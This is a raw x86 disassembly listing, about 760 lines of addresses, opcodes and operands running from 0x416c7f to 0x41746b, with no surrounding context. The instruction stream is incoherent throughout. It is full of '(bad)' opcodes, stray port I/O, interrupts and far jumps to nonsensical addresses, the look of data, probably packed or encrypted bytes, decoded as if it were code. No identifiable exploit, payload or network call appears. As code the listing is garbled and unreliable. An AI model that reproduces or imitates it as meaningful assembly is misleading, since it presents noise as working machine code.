  416c7f:	ins    BYTE PTR es:[edi],dx
  416c80:	pop    esi
  416c81:	cdq    
  416c82:	dec    esi
  416c83:	mov    ah,BYTE PTR [esi-0x2d]
  416c86:	push   ds
  416c87:	mov    eax,ds:0xf56e7d89
  416c8c:	sbb    ecx,edi
  416c8e:	(bad)  
  416c8f:	or     edx,DWORD PTR [ecx+0x50f66a58]
  416c95:	jnp    0x416c35
  416c97:	(bad)  
  416c98:	ficom  DWORD PTR [esi]
  416c9a:	shl    DWORD PTR [edi],1
  416c9c:	or     esi,edx
  416c9e:	mov    ebx,0xb92a9cb6
  416ca3:	mov    esi,0xd762cff2
  416ca8:	inc    ebp
  416ca9:	cs retf 
  416cab:	jae    0x416ce5
  416cad:	lods   al,BYTE PTR ds:[esi]
  416cae:	push   ebx
  416caf:	leave  
  416cb0:	or     esi,edx
  416cb2:	mov    bl,0xad
  416cb4:	mov    eax,ds:0xb54350a6
  416cb9:	pop    ss
  416cba:	push   0x8735eb68
  416cbf:	ror    ebx,cl
  416cc1:	push   esi
  416cc2:	xchg   edi,eax
  416cc3:	jmp    FWORD PTR [esi+edx*8+0x32ee1662]
  416cca:	sub    eax,0x54db4cfe
  416ccf:	into   
  416cd0:	jne    0x416d2b
  416cd2:	xor    DWORD PTR [esp+eax*4],edi
  416cd5:	xor    DWORD PTR [edi],edi
  416cd7:	push   cs
  416cd8:	out    0xce,eax
  416cda:	es dec ebp
  416cdc:	mov    ebp,0x45645b64
  416ce1:	pop    es
  416ce2:	rcl    DWORD PTR [eax-0x26],cl
  416ce5:	cmp    DWORD PTR ds:0xece928bd,edi
  416ceb:	jl     0x416d4e
  416ced:	aam    0x38
  416cef:	loope  0x416d42
  416cf1:	fs cmc 
  416cf3:	pop    ss
  416cf4:	sbb    ch,al
  416cf6:	cli    
  416cf7:	sti    
  416cf8:	xlat   BYTE PTR ds:[ebx]
  416cf9:	mov    esp,0x6ed7f3dc
  416cfe:	js     0x416d33
  416d00:	lock (bad) 
  416d02:	not    bl
  416d04:	aam    0x37
  416d06:	sub    esp,DWORD PTR [ecx-0x5304005e]
  416d0c:	(bad)  
  416d0e:	test   cl,ah
  416d10:	loopne 0x416d00
  416d12:	xchg   ecx,eax
  416d14:	mov    ds:0xdc030fd6,eax
  416d19:	fcmove st,st(2)
  416d1b:	scas   eax,DWORD PTR es:[edi]
  416d1c:	xchg   esi,eax
  416d1d:	mov    esi,DWORD PTR [ecx+0x6]
  416d20:	pop    ecx
  416d21:	push   0x58
  416d23:	std    
  416d24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d25:	call   0x66a94195
  416d2a:	jb     0x416caf
  416d2c:	(bad)  
  416d2d:	in     eax,0xc7
  416d2f:	cwde   
  416d30:	xlat   BYTE PTR ds:[ebx]
  416d31:	jbe    0x416cfa
  416d33:	out    dx,al
  416d34:	jmp    0x87f5:0x9e110321
  416d3b:	pusha  
  416d3c:	fidiv  WORD PTR [edx+0x14]
  416d3f:	aam    0x54
  416d41:	pusha  
  416d42:	outs   dx,BYTE PTR ds:[esi]
  416d43:	jmp    0x891f2063
  416d48:	fisubr DWORD PTR [eax+eiz*4-0x5b]
  416d4c:	clc    
  416d4d:	sbb    edx,DWORD PTR [ebx]
  416d4f:	push   edx
  416d50:	pop    ss
  416d51:	(bad)  
  416d52:	(bad)
  416d55:	xchg   esp,eax
  416d56:	jmp    0xfda07c03
  416d5b:	fucom  st(5)
  416d5d:	ftst   
  416d5f:	lahf   
  416d60:	loop   0x416ce6
  416d62:	jno    0x416d8b
  416d64:	add    esi,DWORD PTR [esi]
  416d66:	leave  
  416d67:	data16 (bad) 
  416d69:	or     BYTE PTR [edi],0xd4
  416d6c:	aaa    
  416d6d:	xchg   DWORD PTR [ecx+0x21],ebp
  416d70:	mov    WORD PTR [eax*2+0xa73dacf],?
  416d77:	daa    
  416d78:	add    bl,BYTE PTR [esi]
  416d7a:	push   ebx
  416d7b:	xor    BYTE PTR [ebp-0x2a],bl
  416d7e:	sub    al,0xff
  416d80:	test   al,0xf6
  416d82:	(bad)  
  416d83:	mov    al,fs:0x7ed86c37
  416d89:	fild   DWORD PTR fs:[ecx-0x76a1c0e6]
  416d90:	cmc    
  416d91:	aam    0xf9
  416d93:	pushf  
  416d94:	xor    eax,0x6e
  416d97:	sbb    DWORD PTR [esi+eiz*2+0x4ed9119e],esi
  416d9e:	add    BYTE PTR [edx-0x63c8ad38],0x16
  416da5:	stos   DWORD PTR es:[edi],eax
  416da6:	push   edx
  416da7:	aam    0xbc
  416da9:	cmp    ecx,DWORD PTR [edx+0xd]
  416dac:	ins    DWORD PTR es:[edi],dx
  416dad:	cmp    ebx,edi
  416daf:	aam    0xda
  416db1:	cwde   
  416db2:	fild   WORD PTR [ebx+0x5247b6c5]
  416db8:	mov    dl,0xd6
  416dba:	or     bh,BYTE PTR [ecx]
  416dbc:	lods   eax,DWORD PTR ds:[esi]
  416dbd:	enter  0xa4eb,0x19
  416dc1:	xor    BYTE PTR [ecx-0x6b],0xef
  416dc5:	adc    DWORD PTR [esi-0x30c3b0b4],esi
  416dcb:	cmp    edi,DWORD PTR [eax+0x36]
  416dce:	lock fwait
  416dd0:	or     ebp,DWORD PTR [edx-0x2a19b3b6]
  416dd6:	sbb    ebp,ebx
  416dd8:	dec    esp
  416dd9:	xchg   ecx,eax
  416dda:	js     0x416e17
  416ddc:	fisub  DWORD PTR [eax-0x7713dbef]
  416de2:	test   DWORD PTR [edi],ebx
  416de4:	stc    
  416de5:	aad    0x88
  416de7:	test   eax,ecx
  416de9:	ins    BYTE PTR es:[edi],dx
  416dea:	ret    
  416deb:	pusha  
  416dec:	stos   BYTE PTR es:[edi],al
  416ded:	sub    al,BYTE PTR [eax]
  416def:	out    dx,al
  416df0:	fnstenv [esi-0x3914d8cc]
  416df6:	test   al,0xba
  416df8:	out    dx,al
  416df9:	f2xm1  
  416dfb:	shl    BYTE PTR [ebx+0x24e983df],cl
  416e01:	sbb    DWORD PTR [edi],ebx
  416e03:	fstp   st(2)
  416e05:	(bad)  
  416e06:	imul   ecx,ecx,0xfffffff5
  416e09:	iret   
  416e0a:	lods   al,BYTE PTR ds:[esi]
  416e0b:	lock out 0xdf,al
  416e0e:	dec    edi
  416e0f:	(bad)  
  416e10:	std    
  416e11:	cmp    eax,0xbeda7ff8
  416e16:	repz fcom DWORD PTR [esi]
  416e19:	xchg   esi,eax
  416e1a:	push   0xffffffc5
  416e1c:	sub    al,0x9c
  416e1e:	add    eax,0xe7850a54
  416e23:	fwait
  416e24:	int    0x5d
  416e26:	(bad)  
  416e27:	(bad)  
  416e28:	aam    0xcf
  416e2a:	fidivr WORD PTR [edx-0x7c3e93e8]
  416e30:	xor    al,0xc8
  416e32:	gs js  0x416e0f
  416e35:	in     al,dx
  416e36:	pushf  
  416e37:	(bad)  
  416e39:	icebp  
  416e3a:	sbb    BYTE PTR [esi-0x52],dh
  416e3d:	(bad)  
  416e3e:	add    DWORD PTR [edx+eiz*2-0x4b538975],0x4b
  416e46:	jno    0x416e87
  416e48:	iret   
  416e49:	xor    cl,bh
  416e4b:	retf   0x7814
  416e4e:	in     al,0xd3
  416e50:	cwde   
  416e51:	loop   0x416eb3
  416e53:	dec    ebx
  416e54:	and    edi,DWORD PTR [ebx-0x5f]
  416e57:	adc    dl,bl
  416e59:	mov    ecx,0xd7fd5e07
  416e5e:	rcl    BYTE PTR [ebx],0xcd
  416e61:	scas   eax,DWORD PTR es:[edi]
  416e62:	hlt    
  416e63:	jnp    0x416e28
  416e65:	push   esi
  416e66:	jno    0x416dfc
  416e68:	cs ret 0x927c
  416e6c:	mov    esp,0xbfd771a1
  416e71:	out    0x3d,al
  416e73:	mov    edx,0xd19c2408
  416e78:	bndldx bnd2,[edx-0x50]
  416e7c:	jp     0x416e61
  416e7e:	xor    BYTE PTR [edi+ebp*1+0x11],dl
  416e82:	jno    0x416ede
  416e84:	push   edi
  416e85:	cmp    ebx,DWORD PTR [ebp-0x63799d1e]
  416e8b:	shl    DWORD PTR [ecx-0x23],cl
  416e8e:	shl    DWORD PTR [esi+eiz*2-0x78],0x48
  416e93:	xchg   esp,eax
  416e94:	retf   
  416e95:	mov    dh,0xa3
  416e97:	jnp    0x416e3b
  416e99:	mov    dh,0x8d
  416e9b:	jns    0x416eb9
  416e9d:	push   ds
  416e9e:	xlat   BYTE PTR ds:[ebx]
  416e9f:	shl    DWORD PTR [esi+ebx*2-0x203acff0],cl
  416ea6:	adc    bl,BYTE PTR [edi]
  416ea8:	retf   
  416ea9:	mov    WORD PTR gs:[esi],?
  416eac:	xchg   DWORD PTR [esi+0x79],edx
  416eaf:	fs jp  0x416e9f
  416eb2:	or     al,0xf2
  416eb4:	xor    edx,ebx
  416eb6:	push   edx
  416eb7:	ret    
  416eb8:	sub    dh,BYTE PTR [eax]
  416eba:	stos   BYTE PTR es:[edi],al
  416ebb:	xor    DWORD PTR [edx],edi
  416ebd:	cmp    eax,0xce61c01b
  416ec2:	jno    0x416ea5
  416ec4:	retf   0xc1f1
  416ec7:	ficomp WORD PTR [ebx]
  416ec9:	inc    esp
  416eca:	lods   eax,DWORD PTR ds:[esi]
  416ecb:	fucomip st,st(6)
  416ecd:	into   
  416ece:	xchg   bl,bl
  416ed0:	inc    ecx
  416ed1:	stos   BYTE PTR es:[edi],al
  416ed2:	shld   DWORD PTR [eax-0x25fce5f5],ebx,0x99
  416eda:	addr16 xchg ebp,eax
  416edc:	pop    eax
  416edd:	add    BYTE PTR [esi-0x39],cl
  416ee0:	aaa    
  416ee1:	(bad)  
  416ee2:	fdivrp st(3),st
  416ee4:	mov    gs:0xe4981222,eax
  416eea:	jo     0x416f69
  416eec:	mov    esp,0x74758c66
  416ef1:	mov    ds:0xd4c8e1da,al
  416ef6:	cmp    BYTE PTR [eax],ah
  416ef8:	hlt    
  416ef9:	push   ebx
  416efa:	int3   
  416efb:	scas   al,BYTE PTR es:[edi]
  416efc:	call   0x16b9:0xbbf4e791
  416f03:	pop    esi
  416f04:	sbb    ah,BYTE PTR [ebx+0x6a]
  416f07:	add    al,0xc3
  416f09:	xchg   esi,eax
  416f0a:	and    esp,edx
  416f0c:	add    BYTE PTR [ebx+0x6e121cb5],bl
  416f12:	lea    ecx,[esi-0x75d26b27]
  416f18:	mov    ebp,0xf5983e12
  416f1d:	jg     0x416f30
  416f1f:	cmp    DWORD PTR [ebp-0x2a],ebp
  416f22:	lods   al,BYTE PTR ds:[esi]
  416f23:	sbb    edi,DWORD PTR [ecx+0x59bcd2fa]
  416f29:	cld    
  416f2a:	addr16 (bad) 
  416f2c:	jo     0x416f1a
  416f2e:	pop    ebp
  416f2f:	aam    0x3b
  416f31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f32:	in     al,dx
  416f33:	mov    ecx,0xd87d9e41
  416f38:	ficom  DWORD PTR [edx+0xf228e31]
  416f3e:	add    ecx,DWORD PTR [ebp+0x5d7fe0da]
  416f44:	popa   
  416f45:	cmp    al,0x97
  416f47:	add    BYTE PTR [ecx+0x2edbc0bf],dl
  416f4d:	(bad)  
  416f4e:	fidiv  DWORD PTR [esi+0x7c295274]
  416f54:	push   0xffffffff
  416f56:	push   esp
  416f57:	shr    BYTE PTR [ecx+0xf],1
  416f5a:	jno    0x416efc
  416f5c:	mov    bl,0x2a
  416f5e:	daa    
  416f5f:	fisub  WORD PTR [ebx-0x6a8bf12a]
  416f65:	jno    0x416f06
  416f67:	ret    
  416f68:	mov    eax,fs:0x82daff87
  416f6e:	jbe    0x416f9c
  416f70:	push   ds
  416f71:	inc    ebx
  416f72:	push   esi
  416f73:	scas   al,BYTE PTR es:[edi]
  416f74:	test   DWORD PTR [edx-0x1e],edi
  416f77:	in     al,dx
  416f78:	fidiv  DWORD PTR [edx-0x40a982ab]
  416f7e:	pop    esi
  416f7f:	jecxz  0x416f5b
  416f81:	ds xchg bl,cl
  416f84:	push   ebx
  416f85:	jno    0x416f46
  416f87:	sbb    bl,bh
  416f89:	mov    bh,0xc3
  416f8b:	imul   ebx,ecx,0xffffffd6
  416f8e:	lods   eax,DWORD PTR ds:[esi]
  416f8f:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  416f91:	push   esp
  416f92:	xchg   ebx,ebx
  416f94:	inc    edx
  416f95:	adc    eax,0xa4e7a86a
  416f9a:	mov    ds:0xd3f33a27,eax
  416f9f:	cmp    al,0xc3
  416fa1:	(bad)  
  416fa2:	mov    DWORD PTR [ecx+0x68042c39],edx
  416fa8:	js     0x41701c
  416faa:	jno    0x41700d
  416fac:	pop    ds
  416fad:	(bad)  
  416faf:	mov    eax,0xc55068cf
  416fb4:	in     al,0x82
  416fb6:	sbb    BYTE PTR [ecx-0x20bbad66],dl
  416fbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fbd:	mov    ah,0xd9
  416fbf:	cdq    
  416fc0:	ficomp DWORD PTR [eax+edi*2]
  416fc3:	pop    es
  416fc4:	retf   
  416fc5:	pop    esp
  416fc6:	adc    BYTE PTR [edi-0x64],0xd6
  416fca:	retf   
  416fcb:	cmp    BYTE PTR [ebx-0x5c],0xda
  416fcf:	mov    bh,0xa2
  416fd1:	sbb    esi,DWORD PTR [eax-0x73]
  416fd4:	mov    ah,BYTE PTR [esi+0x1e]
  416fd7:	call   0x12def976
  416fdc:	jl     0x416fb4
  416fde:	in     eax,0xc6
  416fe0:	rdpmc  
  416fe2:	cmp    DWORD PTR [edi+edi*2-0x3b],edx
  416fe6:	jno    0x416fa7
  416fe8:	scas   al,BYTE PTR es:[edi]
  416fe9:	inc    ecx
  416fea:	mov    cl,0x5a
  416fec:	(bad)  
  416fed:	mov    ebx,0xdcf6ca9b
  416ff2:	(bad)  
  416ff3:	sti    
  416ff4:	pop    edx
  416ff5:	dec    edx
  416ff6:	(bad)  
  416ff7:	jbe    0x416fb4
  416ff9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ffa:	jno    0x41702e
  416ffc:	lahf   
  416ffd:	into   
  416ffe:	and    eax,0x39e95dc3
  417003:	aam    0x52
  417005:	sbb    al,0x6b
  417007:	in     al,0x80
  417009:	fs gs fcmovu st,st(2)
  41700d:	rcr    DWORD PTR [eax+0x29],0x9
  417011:	push   0xd60a7189
  417016:	push   edx
  417017:	sbb    DWORD PTR [ebp-0x1f],esi
  41701a:	jle    0x416fec
  41701c:	out    0x1f,al
  41701e:	jno    0x416ff3
  417020:	repz jmp 0x417063
  417023:	adc    BYTE PTR cs:[edi],0x55
  417027:	cwde   
  417028:	adc    al,0xa3
  41702a:	icebp  
  41702b:	push   ebx
  41702c:	xchg   ebx,eax
  41702d:	pop    ds
  41702e:	ins    DWORD PTR es:[edi],dx
  41702f:	aas    
  417030:	ficom  WORD PTR [edi+0x71]
  417033:	out    0x6e,eax
  417035:	dec    edx
  417036:	mov    ebp,0x872b7034
  41703b:	sar    DWORD PTR [ebp-0x11b49dba],cl
  417041:	cmc    
  417042:	pop    esp
  417043:	or     dl,bl
  417045:	dec    ebx
  417046:	cmp    ebp,DWORD PTR [eax+eax*1+0x1a]
  41704a:	int3   
  41704b:	push   ecx
  41704c:	push   0xae7ab2c8
  417051:	xor    dl,BYTE PTR [ecx-0x7b]
  417054:	inc    ecx
  417055:	add    al,0x2f
  417057:	out    dx,al
  417058:	fidivr DWORD PTR [esi+ecx*8]
  41705b:	pusha  
  41705c:	pushf  
  41705d:	data16 scas al,BYTE PTR es:[edi]
  41705f:	xor    al,0xfd
  417061:	aad    0x93
  417063:	xor    eax,ebx
  417065:	xor    dh,BYTE PTR [edi]
  417067:	js     0x417060
  417069:	push   ebx
  41706a:	ja     0x41703a
  41706c:	retf   
  41706d:	or     DWORD PTR [ecx],edi
  41706f:	dec    edx
  417070:	cmp    eax,0xdd3e5016
  417075:	mov    al,ds:0x1701bdba
  41707a:	fcmovbe st,st(2)
  41707c:	mov    al,ds:0x25b036ae
  417081:	jmp    0x5a5f1040
  417086:	jno    0x417097
  417088:	mov    edi,0xe6c75e14
  41708d:	push   cs
  41708e:	mov    edx,0x5c7385d2
  417093:	enter  0xdeb6,0xfd
  417097:	mov    bl,0x8c
  417099:	ins    BYTE PTR es:[edi],dx
  41709a:	jno    0x4170ee
  41709c:	jmp    0xcd427d64
  4170a1:	jmp    0x4170b1
  4170a3:	aam    0xb2
  4170a5:	test   dl,ch
  4170a7:	out    0x89,al
  4170a9:	or     esp,DWORD PTR [ebx+0x3b37dad9]
  4170af:	mov    ah,0x98
  4170b1:	mul    DWORD PTR ds:[edi-0x4d]
  4170b5:	xbegin 0x312f3710
  4170bb:	rcl    DWORD PTR [esi-0x2],0x1b
  4170bf:	(bad)  
  4170c0:	xlat   BYTE PTR ds:[ebx]
  4170c1:	(bad)  
  4170c2:	xchg   edx,eax
  4170c3:	mov    DWORD PTR [eax],ecx
  4170c5:	lock sti 
  4170c7:	add    eax,DWORD PTR [ebx+0x40]
  4170ca:	push   ebp
  4170cb:	int    0x89
  4170cd:	sbb    DWORD PTR [ebp+0x60a5ff0d],0x40
  4170d4:	sbb    BYTE PTR [ebx],al
  4170d6:	mov    DWORD PTR [edx+ebx*8-0xb],ebp
  4170da:	and    al,ah
  4170dc:	retf   
  4170dd:	cs mov ecx,0x3dd5f54b
  4170e3:	pop    edi
  4170e4:	lock inc esp
  4170e6:	(bad)  
  4170e7:	jp     0x417153
  4170e9:	test   al,0x71
  4170eb:	popf   
  4170ec:	mov    eax,ds:0x2b95d884
  4170f1:	sbb    al,0x7b
  4170f3:	rcl    DWORD PTR [eax-0x2f],cl
  4170f6:	out    dx,al
  4170f7:	jnp    0x417132
  4170f9:	cs mov ebx,0x1d32da78
  4170ff:	fcomp  QWORD PTR [esi+0x4b]
  417102:	xchg   edi,eax
  417103:	mov    ds:0x5552d5e1,eax
  417108:	sub    BYTE PTR [bp+di-0x2a],dh
  41710c:	inc    ebx
  41710d:	or     DWORD PTR [ebp+0x53],edx
  417110:	mov    ds:0xdeb8d462,eax
  417115:	push   ebp
  417116:	mov    dl,0x61
  417118:	mov    al,ds:0x995edf70
  41711d:	mov    eax,0x95eb96f6
  417122:	inc    edx
  417123:	nop
  417124:	jb     0x4170b0
  417126:	adc    dh,BYTE PTR [ecx+ebx*8-0x2b89c152]
  41712d:	xor    al,0x9f
  41712f:	or     ch,dl
  417131:	adc    al,0xde
  417133:	int3   
  417134:	adc    al,0xcc
  417136:	gs cmc 
  417138:	and    BYTE PTR [esi-0x2b],0x63
  41713c:	aas    
  41713d:	out    0x65,eax
  41713f:	sub    BYTE PTR [ebx-0x61],ah
  417142:	lahf   
  417143:	rcr    BYTE PTR [ecx+0x1af1d1d2],cl
  417149:	xor    cl,BYTE PTR [ebp-0x2c]
  41714c:	pop    ss
  41714d:	jae    0x41716c
  41714f:	pushf  
  417150:	and    DWORD PTR [ebp+0x24],0x6a64daa5
  417157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417158:	adc    eax,0xadff4e79
  41715d:	mov    eax,ds:0xd5ae4108
  417162:	ins    BYTE PTR es:[edi],dx
  417163:	mov    ah,BYTE PTR [ecx+0x305290aa]
  417169:	imul   eax,DWORD PTR [edx-0x1a],0x39418544
  417170:	out    0x25,eax
  417172:	jle    0x41714b
  417174:	cmp    al,0xd6
  417176:	ins    BYTE PTR es:[edi],dx
  417177:	jmp    0x48a3b4
  41717c:	hlt    
  41717d:	shr    BYTE PTR [esi+0x46],cl
  417180:	cmp    cl,BYTE PTR [esi+0xddd892e]
  417186:	mov    ch,0xe3
  417188:	idiv   DWORD PTR [ecx+0x564b25d6]
  41718e:	lock pusha 
  417190:	adc    eax,0xda32f33d
  417195:	and    eax,0x56b9f056
  41719a:	jae    0x417163
  41719c:	rcl    esi,cl
  41719e:	cmp    al,0xc9
  4171a0:	in     al,0xc7
  4171a2:	imul   eax,DWORD PTR ds:0xe67071a1,0x60c200cb
  4171ac:	in     eax,dx
  4171ad:	les    edx,FWORD PTR [ecx-0x7f295990]
  4171b3:	jno    0x41714c
  4171b5:	push   eax
  4171b6:	push   es
  4171b7:	loope  0x4171b4
  4171b9:	jg     0x417210
  4171bb:	jp     0x4171f8
  4171bd:	leave  
  4171be:	jno    0x417228
  4171c0:	sbb    al,0x1b
  4171c2:	imul   eax,DWORD PTR [edi-0x62562a79],0x88a5628b
  4171cc:	scas   al,BYTE PTR es:[edi]
  4171cd:	push   es
  4171ce:	nop
  4171cf:	dec    esi
  4171d0:	fisub  DWORD PTR [ebx-0x437655e6]
  4171d6:	sbb    BYTE PTR [edx],ch
  4171d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171d9:	int    0x13
  4171db:	rol    BYTE PTR [edx-0x65750efd],0x92
  4171e2:	imul   esp,DWORD PTR [edx-0x26],0x1d
  4171e6:	jmp    0xbefe:0x4bc3ceb2
  4171ed:	(bad)  
  4171ee:	cmp    bl,cl
  4171f0:	adc    ebp,0xffffffc0
  4171f3:	jb     0x41720b
  4171f5:	push   ecx
  4171f6:	push   edx
  4171f7:	retf   
  4171f8:	lock xchg ecx,eax
  4171fa:	icebp  
  4171fb:	sub    edx,esp
  4171fd:	mov    eax,ds:0xd8ceaa67
  417202:	jbe    0x4171d7
  417204:	test   DWORD PTR [ebp+0x3b70a793],0x5adab804
  41720e:	shl    ah,1
  417210:	lock cmp al,0xf9
  417213:	add    esi,ebx
  417215:	aad    0x81
  417217:	into   
  417218:	imul   edi,DWORD PTR [edi-0x64ab1d6f],0x33
  41721f:	imul   esi,edi,0x579dcdd5
  417225:	jg     0x4171e9
  417227:	clc    
  417228:	xor    dl,dh
  41722a:	addr16 mov ch,0xf6
  41722d:	neg    DWORD PTR [eax+edi*2-0x74]
  417231:	dec    esi
  417232:	jno    0x4171ef
  417234:	test   eax,0x1b128d1
  417239:	or     al,0x86
  41723b:	ror    DWORD PTR [esp+edi*2-0x7],cl
  41723f:	bnd jns 0x417256
  417242:	dec    ebp
  417243:	pop    ecx
  417244:	ficomp DWORD PTR [eax+ecx*1+0x1c135640]
  41724b:	sub    al,0xf0
  41724d:	aad    0xf1
  41724f:	or     eax,0x9b203fba
  417254:	fmul   st,st(1)
  417256:	xor    eax,DWORD PTR [ebx+ecx*8+0x507c3e56]
  41725d:	jo     0x417270
  41725f:	jo     0x417220
  417261:	(bad)  
  417262:	push   0x26579a2
  417267:	fwait
  417268:	out    dx,eax
  417269:	mov    WORD PTR ds:0x1ad1773f,fs
  41726f:	cmp    edi,DWORD PTR [ebx+0x4f23f14f]
  417275:	cmp    dh,BYTE PTR [esi]
  417277:	shr    DWORD PTR [esi+0x5468f19f],cl
  41727d:	mov    eax,ds:0x8f3a946f
  417282:	xchg   edx,eax
  417283:	pop    ebp
  417284:	int3   
  417285:	or     BYTE PTR [ecx+0x816b2aa],0x5d
  41728c:	(bad)  
  41728e:	jmp    0x417263
  417290:	jl     0x417299
  417292:	inc    ecx
  417293:	(bad)  
  417294:	leave  
  417295:	push   ecx
  417296:	xlat   BYTE PTR ds:[ebx]
  417297:	add    ecx,esp
  417299:	jbe    0x4172f8
  41729b:	pushf  
  41729c:	shl    DWORD PTR [esi+0x25a9a95e],0x15
  4172a3:	shl    DWORD PTR [esi-0x7e],cl
  4172a6:	xor    BYTE PTR [ebx+eiz*8],cl
  4172a9:	(bad)  [esp+ebp*8]
  4172ac:	popf   
  4172ad:	xor    BYTE PTR [ecx+0x5b],dh
  4172b0:	mov    cl,0x70
  4172b2:	(bad)  
  4172b3:	mov    edi,DWORD PTR [ebp-0x482ba511]
  4172b9:	jb     0x4172f5
  4172bb:	std    
  4172bc:	xchg   BYTE PTR [esi+edx*4-0x7e],bh
  4172c0:	ficomp DWORD PTR ds:0xd2a89059
  4172c6:	jbe    0x417336
  4172c8:	dec    edi
  4172c9:	shl    DWORD PTR [esi-0x5060119d],cl
  4172cf:	inc    edi
  4172d0:	add    ch,BYTE PTR [eax]
  4172d2:	in     al,0xe4
  4172d4:	fcmove st,st(4)
  4172d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172d7:	repz in al,0x8c
  4172da:	(bad)  
  4172db:	jae    0x41728d
  4172dd:	stos   BYTE PTR es:[edi],al
  4172de:	adc    ebx,DWORD PTR [eax-0x7c]
  4172e1:	(bad)  
  4172e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172e3:	and    edi,DWORD PTR [ecx]
  4172e5:	in     al,0xda
  4172e7:	je     0x4172c3
  4172e9:	cmp    al,0x92
  4172eb:	sub    DWORD PTR [ecx+0x5b],edx
  4172ee:	push   esi
  4172ef:	call   0x7e80495d
  4172f4:	test   eax,0xaf8690a
  4172f9:	stos   BYTE PTR es:[edi],al
  4172fa:	cmp    ch,dl
  4172fc:	or     esp,DWORD PTR [esi]
  4172fe:	sub    al,0xac
  417300:	nop    DWORD PTR [edi]
  417303:	(bad)  
  417304:	cmp    eax,0x7a57b608
  417309:	mov    edi,0x29df549f
  41730e:	jno    0x4172c5
  417310:	mov    ds:0x193bdee2,eax
  417315:	data16 lock int3 
  417318:	std    
  417319:	hlt    
  41731a:	jbe    0x4172bc
  41731c:	mov    ch,0xd6
  41731e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41731f:	jbe    0x417375
  417321:	cmp    eax,0x409cd891
  417326:	popa   
  417327:	rol    BYTE PTR [ebp-0x1a],cl
  41732a:	push   esi
  41732b:	push   esi
  41732c:	mov    bh,0x16
  41732e:	mov    bl,0x79
  417330:	mov    ds:0xd76dedd6,al
  417335:	loopne 0x417389
  417337:	inc    esp
  417338:	dec    edi
  417339:	idiv   BYTE PTR [eax+ecx*8-0x26]
  41733d:	sub    edi,DWORD PTR [esi+ecx*1+0xe3090c0]
  417344:	dec    ebp
  417345:	(bad)  
  417346:	pop    edi
  417347:	fcomp  QWORD PTR [ebp+0x56]
  41734a:	addr16 mov bl,0x75
  41734d:	leave  
  41734e:	jno    0x417318
  417350:	leave  
  417351:	out    0x72,al
  417353:	push   ebp
  417354:	mov    esp,?
  417356:	sub    al,0xcd
  417358:	push   0x98631be5
  41735d:	lods   al,BYTE PTR ss:[esi]
  41735f:	dec    esi
  417360:	or     bl,BYTE PTR [ebx+0x71]
  417363:	xchg   esp,edx
  417365:	xor    eax,0x36b3f2f7
  41736a:	sbb    eax,0x20b829d4
  41736f:	push   edi
  417370:	and    eax,0xdaf3eb64
  417375:	cmp    DWORD PTR [ebx],ecx
  417377:	xor    BYTE PTR [eax+0x768886be],ch
  41737d:	inc    esi
  41737e:	mov    cl,0xc5
  417380:	mov    ecx,0x7aa382e5
  417385:	aas    
  417386:	(bad)  
  417387:	mov    ds:0x757124e7,al
  41738c:	mov    al,0xf0
  41738e:	sahf   
  41738f:	push   0xe3b3f35b
  417394:	js     0x41736c
  417396:	ja     0x417405
  417398:	imul   ebp,DWORD PTR fs:[ecx],0x6ff92e92
  41739f:	cmp    al,0x50
  4173a1:	loop   0x4173f4
  4173a3:	dec    eax
  4173a4:	ror    DWORD PTR [ecx+0xe05be78],cl
  4173aa:	test   DWORD PTR [ebx+esi*8],esi
  4173ad:	aad    0x99
  4173af:	sub    edx,0x55
  4173b2:	cmp    BYTE PTR [ecx+esi*8-0x34368e44],cl
  4173b9:	(bad)  
  4173bb:	leave  
  4173bc:	fist   WORD PTR [ebp-0x1b5725ce]
  4173c2:	mov    esp,0xe2ef13d0
  4173c7:	push   0x13cc8731
  4173cc:	push   0x69
  4173ce:	imul   DWORD PTR [edi]
  4173d0:	fisubr DWORD PTR [eax]
  4173d2:	push   ebp
  4173d3:	pusha  
  4173d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173d5:	outs   dx,DWORD PTR ds:[esi]
  4173d6:	rcl    BYTE PTR [ebx+0x51],cl
  4173d9:	fcom   DWORD PTR [ebx+0x7ab1c3d3]
  4173df:	inc    edi
  4173e0:	mov    edx,0xd5e187b5
  4173e5:	inc    esp
  4173e6:	clc    
  4173e7:	add    DWORD PTR ds:0x3f8bf1d1,edx
  4173ed:	mov    ecx,0x36f9d3f0
  4173f2:	(bad)
  4173f6:	adc    eax,0xf474daee
  4173fb:	xchg   edi,eax
  4173fc:	fsubr  DWORD PTR [ecx-0x68]
  4173ff:	jae    0x41741a
  417401:	mov    bh,0x12
  417403:	ins    DWORD PTR es:[edi],dx
  417404:	and    ecx,DWORD PTR [edi-0x63]
  417407:	mov    ds:0xdcaa163e,al
  41740c:	push   0xfc4f7120
  417411:	out    dx,eax
  417412:	das    
  417413:	aad    0xd5
  417415:	cmp    BYTE PTR [ecx+0x40d6333b],al
  41741b:	jns    0x417442
  41741d:	es jge 0x417402
  417420:	(bad)  
  417421:	push   edx
  417422:	jno    0x41745f
  417424:	loope  0x417479
  417426:	shr    BYTE PTR [esi-0x1e5a7c9f],0x45
  41742d:	(bad)  
  41742e:	mov    ebx,0x21cacac4
  417433:	shl    esp,cl
  417435:	mov    ds:0x7de46855,al
  41743a:	xor    DWORD PTR [eax-0x79d0af79],ebx
  417440:	out    0x96,al
  417442:	sub    bh,BYTE PTR ds:0x653775a
  417448:	jno    0x417438
  41744a:	shl    BYTE PTR [ebp-0x26],0x5f
  41744e:	loopne 0x417425
  417450:	cmp    eax,DWORD PTR [eax-0x42]
  417453:	pop    ebx
  417454:	rcr    BYTE PTR [esi+ecx*4-0x348525ee],1
  41745b:	or     BYTE PTR [ebx],0x54
  41745e:	imul   esp,DWORD PTR [esi-0x26],0xffffff87
  417462:	sub    ecx,DWORD PTR [esi]
  417464:	xlat   BYTE PTR es:[bx]
  417467:	adc    al,0xc2
  417469:	(bad)  
  41746a:	inc    esi
  41746b:	mov    ecx,0x9ac19936
